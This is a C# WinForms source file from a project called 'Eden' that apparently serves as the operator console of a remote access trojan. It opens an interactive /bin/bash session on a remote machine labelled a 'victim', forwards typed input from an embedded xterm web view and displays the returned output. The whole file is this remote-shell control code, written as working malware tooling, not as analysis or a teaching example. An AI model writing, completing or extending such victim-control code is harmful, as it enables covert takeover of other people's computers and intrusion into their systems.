using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmShell : Form
    {
        private clsVictim m_victim { get; init; }
        private string m_szVictimID { get { return m_victim.m_szID; } }
        private string m_szInitDir { get; init; }

        private enum HistoryCmd
        {
            Previous,
            Next,
        }

        public frmShell(clsVictim victim, string szInitDir = ".")
        {
            InitializeComponent();

            m_victim = victim;
            m_szInitDir = szInitDir;

            Text = $@"Shell\\{victim.m_szID}";
        }

        private void fnReceived(clsClient m_clnt, string szVictimID, List<string> asMsg)
        {
            if (!string.Equals(szVictimID, m_szVictimID))
                return;

            try
            {
                if (asMsg[0] == "shell")
                {
                    if (asMsg[1] == "output")
                    {
                        Invoke(() =>
                        {
                            webView21.CoreWebView2.PostWebMessageAsString(asMsg[2]);
                        });
                    }
                }
            }
            catch (Exception ex)
            {

            }
        }

        private void fnInitCmd()
        {
            m_victim.fnSendCommand(new string[]
            {
                "Shell",
                "init",
                "/bin/bash",
                m_szInitDir,
            });
        }

        async void fnSetup()
        {
            string szXtermPath = Path.Combine(Application.StartupPath, "Tools", "xterm", "terminal.html");
            if (!File.Exists(szXtermPath))
            {
                MessageBox.Show(
                    $"Cannot find xterm file: {szXtermPath}\n" +
                    $"This form will be existed.",
                    "File not found",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Error
                );

                Close();

                return; //Ensure do not run the code below.
            }

            //Controls
            m_victim.m_clnt.ServerMessageReceived += fnReceived;

            StartPosition = FormStartPosition.CenterScreen;

            textBox1.Font = new Font("Cascadia Mono", 10.5f);
            textBox1.ForeColor = Color.White;
            textBox1.Text = "/bin/bash";

            //Webview
            await webView21.EnsureCoreWebView2Async();
            webView21.CoreWebView2.Navigate(szXtermPath);
            webView21.CoreWebView2.WebMessageReceived += (s, e) =>
            {
                string szMsg = e.TryGetWebMessageAsString();
                if (szMsg.StartsWith("xterm|input"))
                {
                    string szInput = szMsg.Substring("xterm|input|".Length);
                    m_victim.fnSendCommand(new string[]
                    {
                        "Shell",
                        "input",
                        szInput,
                    });
                }
            };

            fnInitCmd();
        }

        private void frmShell_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                fnInitCmd();
            }
        }

        private void frmShell_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_clnt.ServerMessageReceived -= fnReceived;
        }

        private void frmShell_Resize(object sender, EventArgs e)
        {
            if (webView21.CoreWebView2 != null)
            {
                webView21.CoreWebView2.ExecuteScriptAsync("fitTerminal();");
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            fnInitCmd();
        }
    }
}
